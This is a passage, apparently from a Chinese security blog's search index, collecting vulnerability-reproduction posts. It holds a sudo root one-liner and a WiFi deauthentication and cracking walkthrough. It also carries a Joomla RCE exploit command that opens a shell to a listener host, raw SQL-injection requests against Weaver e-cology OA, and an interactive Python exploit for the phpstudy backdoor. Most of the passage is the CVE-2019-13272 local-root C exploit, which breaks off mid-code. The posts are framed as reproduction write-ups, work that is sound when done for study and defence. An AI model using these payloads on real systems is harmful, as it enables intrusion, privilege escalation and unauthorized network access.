第一个ALL表示允许该用户在任意机器或者终端中使用sudo 括号里面的（ALL,!root）表示命令可以被除了root以外的任意用户身份去执行 最后一个ALL表示被允许执行 漏洞利用利用条件： 知道当前用户名密码 当前用户要在sudo权限列表中 执行下面命令直接跳转到root sudo -u#-1 /bin/bash：表示以root权限执行/bin/bash 修复方案更新到最新版本 参考：https://mp.weixin.qq.com/s/4GWrXo4JO6jF374V1eBybg","categories":[{"name":"Linux提权","slug":"Linux提权","permalink":"http://example.com/categories/Linux%E6%8F%90%E6%9D%83/"}],"tags":[]},{"title":"破解wifi","slug":"破解wifi","date":"2019-10-13T12:57:33.000Z","updated":"2019-11-04T15:11:01.266Z","comments":true,"path":"2019/10/13/破解wifi/","link":"","permalink":"http://example.com/2019/10/13/%E7%A0%B4%E8%A7%A3wifi/","excerpt":"破解WiFi老掉牙的教程，网上一大堆。那我为什么写这个教程？心情大好，第一次用字典跑出来密码。文章末尾分享字典。","text":"破解WiFi老掉牙的教程，网上一大堆。那我为什么写这个教程？心情大好，第一次用字典跑出来密码。文章末尾分享字典。 教程第一步：购买可监听网卡首先你要买个可以监听的网卡才行，然后要收到货，轻轻的插在电脑上~。哈哈，成功一大半了。 第二步：开启监听airmon-ng start wlan0 第三步：扫描WiFiairodump-ng wlan0mon bssid是ap（access point）的mac地址，在这里ap为路由器 pwr代表信号水平，信号只越高说明距离越近，但是注意，-1值说明无法监听 ch表示工作的信道号 enc表示算法加密体系 cipher表示检测到的加密算法 auth表示认证协议 essid即ssid号,wifi的名称 station表示客户端的mac地址（ctrl-c停止扫描） 第四步：抓取握手包airodump-ng -c 11 --ivs -w test --bssid xx:xx:xx:xx:xx:D2 wlan0mon 参数 -c 选取频道号 –ivs -w test 保存ivs格式的包，名字为test –bssid 要破解ap的ssid 出现下面的情况就表示已经抓到了 第五步：强制用户重连我们要抓取的是用户连接WiFi的握手包，不一定刚好抓到，所以可以使用airbase-ng工具让设备断开WiFi。主要是通过给WiFi设备发送一个deauth（反认证）包，让设备断开WiFi，随后它自然会再次连接WiFi。 airbase-ng使用还有一个前提就是：WiFi网络中至少有一个连接的设备，不然，怎么抓取别人连接WiFi的设备的握手包，在扫描网络的时候下面有个station，就代表有设备连接。 aireplay-ng -0 10 -a xx:C3:xx:12:DF:D2 -c 90:xx:52:xx:F7:13 wlan0mon 参数： -0指定发送反认证包的个数 -a指定无线路由器BSSID -c指定强制断开的设备。 第六步：爆破密码字典位置：&lt;https://github.com/TheKingOfDuck/fuzzDicts/blob/master/passwordDict/RW_Password/%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B84952222%E6%9D%A1.rar&gt; 输入以下命令开始爆破 aircrack-ng -w /root/pass.txt /root/test-01.ivs 参数： -w：自己指定本地字典 就这样出来了，舒坦。。。","categories":[{"name":"无线安全","slug":"无线安全","permalink":"http://example.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://example.com/tags/%E6%9D%82%E9%A1%B9/"}]},{"title":"joomla 3.4.6 远程代码执行","slug":"joomla-3-4-6-远程代码执行","date":"2019-10-12T14:07:19.000Z","updated":"2021-02-04T05:14:28.922Z","comments":true,"path":"2019/10/12/joomla-3-4-6-远程代码执行/","link":"","permalink":"http://example.com/2019/10/12/joomla-3-4-6-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"Joomla 3.4.6 远程代码执行漏洞","text":"Joomla 3.4.6 远程代码执行漏洞 Joomla简介Joomla是一套全球知名的内容管理系统。Joomla是使用PHP语言加上MySQL数据库所开发的软件系统。可以在Linux、Windows、MacOSX等各种不同的平台上执行。目前由Open Source Matters开源组织进行开发与支持。自2012年颁奖典礼开始以来，Joomla连续多年成为CMS评奖的冠军。继2015、2016、2017、2018年在全球CMS评测中，它再次获得“最佳开源CMS”奖! 影响范围3.0.0 &lt;= Joomla &lt;= 3.4.6 漏洞危害Joomla对session数据处理不当，攻击者可以发送精心构造的恶意 HTTP 请求，获取服务器权限，实现远程命令执行。 环境搭建下载地址：https://downloads.joomla.org/it/cms/joomla3/3-4-6 直接放到phpstudy里面即可。 访问：http://127.0.0.1 直接下一步，安装完成 主页效果 漏洞利用POC/EXP：https://github.com/kiks7/rusty_joomla_rce 漏洞验证 1python3 rusty_joomla_exploit.py -t http:&#x2F;&#x2F;10.10.10.12&#x2F; -c 上传shell 1python3 rusty_joomla_exploit.py -t http:&#x2F;&#x2F;10.10.10.12&#x2F; -e -l 10.10.10.10 -p 4455 # 记得网址后面有反斜杠，代码中有字符串拼接 菜刀连接http://10.10.10.12//configuration.php，密码是POST with 后面部分 蚁剑连接 漏洞修复升级最新版本：https://downloads.joomla.org","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"joomla","slug":"joomla","permalink":"http://example.com/tags/joomla/"}]},{"title":"74cms v5.0.1 后台CSRF漏洞（CVE-2019-11374）","slug":"骑士CMS-v5-0-1-CSRF漏洞","date":"2019-10-12T14:07:19.000Z","updated":"2021-02-04T05:11:56.742Z","comments":true,"path":"2019/10/12/骑士CMS-v5-0-1-CSRF漏洞/","link":"","permalink":"http://example.com/2019/10/12/%E9%AA%91%E5%A3%ABCMS-v5-0-1-CSRF%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞（CVE-2019-11374）一、漏洞简介在74CMS v5.0.1后台存在一个跨站请求伪造(CSRF)漏洞，该漏洞url：/index.php?m=admin&amp;c=admin&amp;a=add攻击者可以利用该漏洞诱骗管理员点击恶意页面，从而任意添加一个后台管理员账户，达到进入后台，获得一个后台管理员角色的控制权。 二、漏洞影响74CMS v5.0.1 三、复现过程首先我们登录后台页面，并添加管理员，然后添加信息，用burp_suite抓包 当管理员登录后台后，点击攻击者发来的连接即可创建一个新的超级管理员账户 参考链接https://www.023niu.com/show-62-32-1.html","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"74cms","slug":"74cms","permalink":"http://example.com/tags/74cms/"}]},{"title":"泛微之前台注入","slug":"泛微之前台注入","date":"2019-10-10T14:32:03.000Z","updated":"2019-11-04T15:11:11.821Z","comments":true,"path":"2019/10/10/泛微之前台注入/","link":"","permalink":"http://example.com/2019/10/10/%E6%B3%9B%E5%BE%AE%E4%B9%8B%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/","excerpt":"泛微前台SQL注入漏洞介绍泛微提供了移动办公、微信办公、协同办公(OA)、流程管理、信息门户、知识管理、费控管理等功能，适用于手机和pc端，是当今比较主流的OA系统之一。","text":"泛微前台SQL注入漏洞介绍泛微提供了移动办公、微信办公、协同办公(OA)、流程管理、信息门户、知识管理、费控管理等功能，适用于手机和pc端，是当今比较主流的OA系统之一。 原理该漏洞是由于OA系统的WorkflowCenterTreeData接口在收到用户输入的时候未进行安全过滤，oracle数据库传入恶意SQL语句，导致SQL漏洞。 影响范围使用oracle数据库的泛微 e-cology OA 系统 （V8 V9 版本 ） 环境搭建FOFA在线搜索： app=”泛微-协同办公OA” 或者使用钟馗之眼搜索 漏洞利用POC1： 123456789101112POST &#x2F;mobile&#x2F;browser&#x2F;WorkflowCenterTreeData.jsp?node&#x3D;wftype_1&amp;scope&#x3D;2333 HTTP&#x2F;1.1Host: ip:portUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 2236Connection: closeUpgrade-Insecure-Requests: 1formids&#x3D;11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1 POC2： 1234567891011POST &#x2F;mobile&#x2F;browser&#x2F;WorkflowCenterTreeData.jsp?node&#x3D;wftype_1&amp;scope&#x3D;2333 HTTP&#x2F;1.1Host: ip:portUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8 Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 2236Connection: closeUpgrade-Insecure-Requests: 1 formids&#x3D;11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 注入成功的样例如下： 漏洞修复官方补丁下载地址：https://www.weaver.com.cn/cs/securityDownload.asp","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"泛微OA","slug":"泛微OA","permalink":"http://example.com/tags/%E6%B3%9B%E5%BE%AEOA/"}]},{"title":"phpstudy后门","slug":"phpstudy后门","date":"2019-10-08T04:41:42.000Z","updated":"2019-11-04T15:11:34.188Z","comments":true,"path":"2019/10/08/phpstudy后门/","link":"","permalink":"http://example.com/2019/10/08/phpstudy%E5%90%8E%E9%97%A8/","excerpt":"Phpstudy漏洞复现Phpstudy是国内免费的web环境集成程序包。最近爆出phpstudy后门，来做个复现。","text":"Phpstudy漏洞复现Phpstudy是国内免费的web环境集成程序包。最近爆出phpstudy后门，来做个复现。 漏洞危害远程命令执行 影响版本 phpstudy 2016版 php-5.4 phpstudy 2018版 php-5.2.17 phpstudy 2018版 php-5.4.45 后门位置后门存在位置 phpstudy 2016路径 12php\\php-5.2.17\\ext\\php_xmlrpc.dllphp\\php-5.4.45\\ext\\php_xmlrpc.dll phpstudy 2018路径 12PHPTutorial\\php\\php-5.2.17\\ext\\php_xmlrpc.dllPHPTutorial\\php\\php-5.4.45\\ext\\php_xmlrpc.dl 例如我这里的：C:\\phpStudy\\PHPTutorial\\php\\php-5.2.17\\ext\\php_xmlrpc 漏洞利用访问http://10.10.10.12/，burp抓包 //放到 reapter中，修改下面两处： Accept-Encoding: gzip, deflate ===》 这里 burp 会在gzip 和 deflate中间留空格，需要删除空格 gzip,deflate //添加下面这一行，ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7是echo system(&quot;net user&quot;);base64加密后的内容 Accept-Charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 漏洞修复 下载全新的phpstudy软件 从PHP官网下载原始php-5.4.45版本或php-5.2.17版本，替换其中的php_xmlrpc.dll 经验所以，一定要在官网下载东西 EXP简易的exp，没有过滤html页面输出 1234567891011121314151617181920212223242526272829303132333435363738394041# -*-coding:utf-8 -*-import requests import sys import base64def POC(target): print(&quot;===========================================&quot;) print(&quot;********** input exit for quit ************&quot;) print(&quot;===========================================&quot;) command = input(&quot;Command：&quot;) while(True): if(command == &#x27;exit&#x27;): break else: cmd = &quot;echo system(\\&quot;&quot; + command + &quot;\\&quot;);&quot; encodeCmd = cmd.encode(encoding=&quot;utf-8&quot;) headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;, &quot;Accept-Charset&quot;: base64.b64encode(encodeCmd), &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &#125; url = target r = requests.get(url,headers=headers) print(r.text) command = input(&quot;Command：&quot;)def main(): if len(sys.argv) &lt; 2: print(&quot;python phpstudy.py http://127.0.0.1&quot;) else: target = sys.argv[1] POC(target) if __name__ == &quot;__main__&quot;: main()","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"phpstudy后门","slug":"phpstudy后门","permalink":"http://example.com/tags/phpstudy%E5%90%8E%E9%97%A8/"}]},{"title":"CVE_2019_13272","slug":"CVE-2019-13272","date":"2019-10-08T04:32:21.000Z","updated":"2019-11-04T15:12:33.082Z","comments":true,"path":"2019/10/08/CVE-2019-13272/","link":"","permalink":"http://example.com/2019/10/08/CVE-2019-13272/","excerpt":"CVE-2019-13272漏洞复现漏洞危害攻击者能够从普通用户提升到权限比较高的用户","text":"CVE-2019-13272漏洞复现漏洞危害攻击者能够从普通用户提升到权限比较高的用户 漏洞影响范围漏洞类型：Linux本地提权 漏洞影响范围：Linux内核版本低于5.1.17 环境准备 Ubuntu 16.04.5 kernel 4.15.0-29-generic(本次复现利用版本) 下载链接 漏洞利用实现效果：本地提权 POC脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443// Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)// Uses pkexec technique// ---// Original discovery and exploit author: Jann Horn// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903// ---// &lt;bcoles@gmail.com&gt;// - added known helper paths// - added search for suitable helpers// - added automatic targeting// - changed target suid exectuable from passwd to pkexec// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272// ---// Tested on:// - Ubuntu 16.04.5 kernel 4.15.0-29-generic// - Ubuntu 18.04.1 kernel 4.15.0-20-generic// - Ubuntu 19.04 kernel 5.0.0-15-generic// - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic// - Linux Mint 19 kernel 4.15.0-20-generic// - Xubuntu 16.04.4 kernel 4.13.0-36-generic// - ElementaryOS 0.4.1 4.8.0-52-generic// - Backbox 6 kernel 4.18.0-21-generic// - Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64// - Kali kernel 4.19.0-kali5-amd64// - Redcore 1806 (LXQT) kernel 4.16.16-redcore// - MX 18.3 kernel 4.19.37-2~mx17+1// - RHEL 8.0 kernel 4.18.0-80.el8.x86_64// - Debian 9.4.0 kernel 4.9.0-6-amd64// - Debian 10.0.0 kernel 4.19.0-5-amd64// - Devuan 2.0.0 kernel 4.9.0-6-amd64// - SparkyLinux 5.8 kernel 4.19.0-5-amd64// - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64// - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO// - Mageia 6 kernel 4.9.35-desktop-1.mga6// - Antergos 18.7 kernel 4.17.6-1-ARCH// ---// user@linux-mint-19-2:~$ gcc -s poc.c -o ptrace_traceme_root// user@linux-mint-19-2:~$ ./ptrace_traceme_root// Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)// [.] Checking environment ...// [~] Done, looks good// [.] Searching for known helpers ...// [~] Found known helper: /usr/sbin/mate-power-backlight-helper// [.] Using helper: /usr/sbin/mate-power-backlight-helper// [.] Spawning suid process (/usr/bin/pkexec) ...// [.] Tracing midpid ...// [~] Attached to midpid// To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.// See &quot;man sudo_root&quot; for details.//// root@linux-mint-19-2:/home/user#// ---#define _GNU_SOURCE#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;sched.h&gt;#include &lt;stddef.h&gt;#include &lt;stdarg.h&gt;#include &lt;pwd.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/stat.h&gt;#include &lt;linux/elf.h&gt;#define DEBUG#ifdef DEBUG# define dprintf printf#else# define dprintf#endif#define SAFE(expr) (&#123; \\ typeof(expr) __res = (expr); \\ if (__res == -1) &#123; \\ dprintf(&quot;[-] Error: %s\\n&quot;, #expr); \\ return 0; \\ &#125; \\ __res; \\&#125;)#define max(a,b) ((a)&gt;(b) ? (a) : (b))static const char *SHELL = &quot;/bin/bash&quot;;static int middle_success = 1;static int block_pipe[2];static int self_fd = -1;static int dummy_status;static const char *helper_path;static const char *pkexec_path = &quot;/usr/bin/pkexec&quot;;static const char *pkaction_path = &quot;/usr/bin/pkaction&quot;;struct stat st;const char *helpers[1024];const char *known_helpers[] = &#123; &quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;, &quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;, &quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;, &quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;, &quot;/usr/sbin/mate-power-backlight-helper&quot;, &quot;/usr/bin/xfpm-power-backlight-helper&quot;, &quot;/usr/bin/lxqt-backlight_backend&quot;, &quot;/usr/libexec/gsd-wacom-led-helper&quot;, &quot;/usr/libexec/gsd-wacom-oled-helper&quot;, &quot;/usr/libexec/gsd-backlight-helper&quot;, &quot;/usr/lib/gsd-backlight-helper&quot;, &quot;/usr/lib/gsd-wacom-led-helper&quot;, &quot;/usr/lib/gsd-wacom-oled-helper&quot;,&#125;;/* temporary printf; returned pointer is valid until next tprintf */static char *tprintf(char *fmt, ...) &#123; static char buf[10000]; va_list ap; va_start(ap, fmt); vsprintf(buf, fmt, ap); va_end(ap); return buf;&#125;/* * fork, execute pkexec in parent, force parent to trace our child process, * execute suid executable (pkexec) in child. */static int middle_main(void *dummy) &#123; prctl(PR_SET_PDEATHSIG, SIGKILL); pid_t middle = getpid(); self_fd = SAFE(open(&quot;/proc/self/exe&quot;, O_RDONLY)); pid_t child = SAFE(fork()); if (child == 0) &#123; prctl(PR_SET_PDEATHSIG, SIGKILL); SAFE(dup2(self_fd, 42)); /* spin until our parent becomes privileged (have to be fast here) */ int proc_fd = SAFE(open(tprintf(&quot;/proc/%d/status&quot;, middle), O_RDONLY)); char *needle = tprintf(&quot;\\nUid:\\t%d\\t0\\t&quot;, getuid()); while (1) &#123; char buf[1000]; ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0)); buf[buflen] = &#x27;\\0&#x27;; if (strstr(buf, needle)) break; &#125; /* * this is where the bug is triggered. * while our parent is in the middle of pkexec, we force it to become our * tracer, with pkexec&#x27;s creds as ptracer_cred. */ SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL)); /* * now we execute a suid executable (pkexec). * Because the ptrace relationship is considered to be privileged, * this is a proper suid execution despite the attached tracer, * not a degraded one. * at the end of execve(), this process receives a SIGTRAP from ptrace. */ execl(pkexec_path, basename(pkexec_path), NULL); dprintf(&quot;[-] execl: Executing suid executable failed&quot;); exit(EXIT_FAILURE); &#125; SAFE(dup2(self_fd, 0)); SAFE(dup2(block_pipe[1], 1)); /* execute pkexec as current user */ struct passwd *pw = getpwuid(getuid()); if (pw == NULL) &#123; dprintf(&quot;[-] getpwuid: Failed to retrieve username&quot;); exit(EXIT_FAILURE); &#125; middle_success = 1; execl(pkexec_path, basename(pkexec_path), &quot;--user&quot;, pw-&gt;pw_name, helper_path, &quot;--help&quot;, NULL); middle_success = 0; dprintf(&quot;[-] execl: Executing pkexec failed&quot;); exit(EXIT_FAILURE);&#125;/* ptrace pid and wait for signal */static int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) &#123; struct user_regs_struct regs; struct iovec iov = &#123; .iov_base = &amp;regs, .iov_len = sizeof(regs) &#125;; SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL)); SAFE(waitpid(pid, &amp;dummy_status, 0)); SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov)); /* set up indirect arguments */ unsigned long scratch_area = (regs.rsp - 0x1000) &amp; ~0xfffUL; struct injected_page &#123; unsigned long argv[2]; unsigned long envv[1]; char arg0[8]; char path[1]; &#125; ipage = &#123; .argv = &#123; scratch_area + offsetof(struct injected_page, arg0) &#125; &#125;; strcpy(ipage.arg0, arg0); for (int i = 0; i &lt; sizeof(ipage)/sizeof(long); i++) &#123; unsigned long pdata = ((unsigned long *)&amp;ipage)[i]; SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long), (void*)pdata)); &#125; /* execveat(exec_fd, path, argv, envv, flags) */ regs.orig_rax = __NR_execveat; regs.rdi = exec_fd; regs.rsi = scratch_area + offsetof(struct injected_page, path); regs.rdx = scratch_area + offsetof(struct injected_page, argv); regs.r10 = scratch_area + offsetof(struct injected_page, envv); regs.r8 = AT_EMPTY_PATH; SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov)); SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL)); SAFE(waitpid(pid, &amp;dummy_status, 0));&#125;static int middle_stage2(void) &#123; /* our child is hanging in signal delivery from execve()&#x27;s SIGTRAP */ pid_t child = SAFE(waitpid(-1, &amp;dummy_status, 0)); force_exec_and_wait(child, 42, &quot;stage3&quot;); return 0;&#125;// * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * *static int spawn_shell(void) &#123; SAFE(setresgid(0, 0, 0)); SAFE(setresuid(0, 0, 0)); execlp(SHELL, basename(SHELL), NULL); dprintf(&quot;[-] execlp: Executing shell %s failed&quot;, SHELL); exit(EXIT_FAILURE);&#125;// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * *static int check_env(void) &#123; const char* xdg_session = getenv(&quot;XDG_SESSION_ID&quot;); dprintf(&quot;[.] Checking environment ...\\n&quot;); if (stat(pkexec_path, &amp;st) != 0) &#123; dprintf(&quot;[-] Could not find pkexec executable at %s&quot;, pkexec_path); exit(EXIT_FAILURE); &#125; if (stat(pkaction_path, &amp;st) != 0) &#123; dprintf(&quot;[-] Could not find pkaction executable at %s&quot;, pkaction_path); exit(EXIT_FAILURE); &#125; if (xdg_session == NULL) &#123; dprintf(&quot;[!] Warning: $XDG_SESSION_ID is not set\\n&quot;); return 1; &#125; if (system(&quot;/bin/loginctl --no-ask-password show-session $XDG_SESSION_ID | /bin/grep Remote=no &gt;&gt;/dev/null 2&gt;&gt;/dev/null&quot;) != 0) &#123; dprintf(&quot;[!] Warning: Could not find active PolKit agent\\n&quot;); return 1; &#125; if (stat(&quot;/usr/sbin/getsebool&quot;, &amp;st) == 0) &#123; if (system(&quot;/usr/sbin/getsebool deny_ptrace 2&gt;1 | /bin/grep -q on&quot;) == 0) &#123; dprintf(&quot;[!] Warning: SELinux deny_ptrace is enabled\\n&quot;); return 1; &#125; &#125; dprintf(&quot;[~] Done, looks good\\n&quot;); return 0;&#125;/* * Use pkaction to search PolKit policy actions for viable helper executables. * Check each action for allow_active=yes, extract the associated helper path, * and check the helper path exists. */int find_helpers() &#123; char cmd[1024]; snprintf(cmd, sizeof(cmd), &quot;%s --verbose&quot;, pkaction_path); FILE *fp; fp = popen(cmd, &quot;r&quot;); if (fp == NULL) &#123; dprintf(&quot;[-] Failed to run: %s\\n&quot;, cmd); exit(EXIT_FAILURE); &#125; char line[1024]; char buffer[2048]; int helper_index = 0; int useful_action = 0; static const char *needle = &quot;org.freedesktop.policykit.exec.path -&gt; &quot;; int needle_length = strlen(needle); while (fgets(line, sizeof(line)-1, fp) != NULL) &#123; /* check the action uses allow_active=yes*/ if (strstr(line, &quot;implicit active:&quot;)) &#123; if (strstr(line, &quot;yes&quot;)) &#123; useful_action = 1; &#125; continue; &#125; if (useful_action == 0) continue; useful_action = 0; /* extract the helper path */ int length = strlen(line); char* found = memmem(&amp;line[0], length, needle, needle_length); if (found == NULL) continue; memset(buffer, 0, sizeof(buffer)); for (int i = 0; found[needle_length + i] != &#x27;\\n&#x27;; i++) &#123; if (i &gt;= sizeof(buffer)-1) continue; buffer[i] = found[needle_length + i]; &#125; if (strstr(&amp;buffer[0], &quot;/xf86-video-intel-backlight-helper&quot;) != 0 || strstr(&amp;buffer[0], &quot;/cpugovctl&quot;) != 0 || strstr(&amp;buffer[0], &quot;/package-system-locked&quot;) != 0 || strstr(&amp;buffer[0], &quot;/cddistupgrader&quot;) != 0) &#123; dprintf(&quot;[.] Ignoring blacklisted helper: 